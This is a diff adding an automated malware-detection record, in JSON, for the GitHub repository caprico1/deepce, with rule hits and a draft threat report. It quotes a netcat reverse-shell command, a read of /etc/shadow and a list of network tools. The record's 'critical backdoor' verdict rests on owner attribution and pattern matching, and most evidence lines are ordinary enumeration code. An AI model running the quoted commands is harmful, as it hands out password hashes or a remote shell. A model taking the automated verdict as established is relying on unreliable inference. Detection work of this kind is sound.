@@ -1,0 +1,192 @@
+{
+  "finding": {
+    "key": "repository:caprico1/deepce",
+    "kind": "repository",
+    "family": "",
+    "id": "caprico1/deepce",
+    "url": "https://github.com/Caprico1/deepce",
+    "registry": "github",
+    "owner": "caprico1",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 15,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "credential_harvest/shadow-read; reverse_shell/nc-exec; network_scan/scanner; enumeration/host-recon; enumeration/net-recon",
+    "evidence_locations": "deepce.sh:892; deepce.sh:934; deepce.sh:131; deepce.sh:259; deepce.sh:276; deepce.sh:284; deepce.sh:287; deepce.sh:290; deepce.sh:366; deepce.sh:370; deepce.sh:443; deepce.sh:444; deepce.sh:445; deepce.sh:447; deepce.sh:448; deepce.sh:452; deepce.sh:460; deepce.sh:461; deepce.sh:473",
+    "c2_hosts": "",
+    "iocs": "deepce.sh",
+    "matched_signatures": "",
+    "reasons": "repository under owner Caprico1 of a known-malicious repo | Tier-2 confirmed (bash score 12)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260910T230848Z",
+    "last_seen": "hunt-20260910T230848Z",
+    "evidence_file": "repositories/caprico1_deepce.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "deepce.sh",
+      "line": 892,
+      "category": "credential_harvest",
+      "rule": "shadow-read",
+      "snippet": "cmd=\"cat /etc/shadow\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 934,
+      "category": "reverse_shell",
+      "rule": "nc-exec",
+      "snippet": "cmd=\"/bin/sh -c nc $ip $port -e /bin/sh\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 131,
+      "category": "network_scan",
+      "rule": "scanner",
+      "snippet": "USEFUL_CMDS=\"curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 131,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "USEFUL_CMDS=\"curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 259,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "if ! [ \"$(id -u)\" = 0 ]; then"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 276,
+      "category": "network_scan",
+      "rule": "scanner",
+      "snippet": "if apt install --no-install-recommends --force-yes -y dnsutils curl nmap iputils-ping libcap2-bin >/dev/null 2>&1; then"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 284,
+      "category": "network_scan",
+      "rule": "scanner",
+      "snippet": "apk add bind-tools curl nmap libcap"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 287,
+      "category": "network_scan",
+      "rule": "scanner",
+      "snippet": "yum install bind-utils curl nmap libcap"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 290,
+      "category": "network_scan",
+      "rule": "scanner",
+      "snippet": "apt-get install -y dnsutils curl nmap inetutils-ping libcap2-bin"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 366,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "if [ \"$(id -u)\" = 0 ]; then"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 370,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "printSuccess \"$(whoami)\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 443,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "# Get container ID"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 444,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "containerID=\"$(cat /etc/hostname)\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 445,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "#containerID=\"$(hostname)\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 447,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "# Get container full ID"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 448,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "printResult \"Container ID ............\" \"$containerID\" \"Unknown\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 452,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "printResult \"Container Full ID .......\" \"$containerFullID\" \"Unknown\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 460,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "if [ -x \"$(command -v hostname)\" ]; then"
+    },
+    {
+      "file": "deepce.sh",
+      "line": 461,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "containerIP=\"$(hostname -I 2>/dev/null || hostname -i)\""
+    },
+    {
+      "file": "deepce.sh",
+      "line": 473,
+      "category": "enumeration",
+      "rule": "net-recon",
+      "snippet": "if [ -x \"$(command -v netstat)\" ]; then"
+    }
+  ],
+  "commit_sha": "c36a6aa32e52ac517fb4eab9792a3750ea3bd214",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/caprico1/deepce",
+    "version_info": "all",
+    "threat_description": "Reverse shell backdoor. Payload in deepce.sh.\nOutbound: C2. It opens a remote shell to an attacker host (deepce.sh:934).\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: deepce.sh\n- Outbound: C2. It opens a remote shell to an attacker host (deepce.sh:934).\n- deepce.sh:892: reads /etc/shadow password hashes\n- deepce.sh:934: netcat hands a shell to a remote host (reverse shell)\n- deepce.sh:131: matches malware behavior (+4 more)\n- deepce.sh:131: matches malware behavior (+11 more)\n- deepce.sh:473: matches malware behavior",
+    "publisher": "caprico1",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L892\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L934\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L131\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L259\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L276\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L284\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L287\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L290\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L366\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L370\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L443\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L444\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L445\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L447\nhttps://github.com/caprico1/deepce/blob/c36a6aa32e52ac517fb4eab9792a3750ea3bd214/deepce.sh#L448",
+    "verified_iocs": "deepce.sh",
+    "contributors": [],
+    "first_seen": "2026-09-10T23:08:48Z",
+    "last_seen": "2026-09-10T23:08:48Z"
+  }
+}
